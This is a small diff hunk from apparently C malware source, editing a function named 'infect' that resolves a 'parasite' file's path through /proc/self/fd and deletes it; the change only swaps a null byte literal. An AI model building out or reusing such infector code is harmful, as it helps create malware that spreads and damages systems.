@@ -111,7 +111,7 @@ void infect(FILE* h, FILE* p){
   // get file name of parasite and delete it
   sprintf(file_link, "/proc/self/fd/%d", fileno(p));
   ssize_t len = readlink(file_link, file_name, sizeof(file_name));
-  file_name[len] = 0x00; 
+  file_name[len] = '\0'; 
   remove(file_name);
 }
 
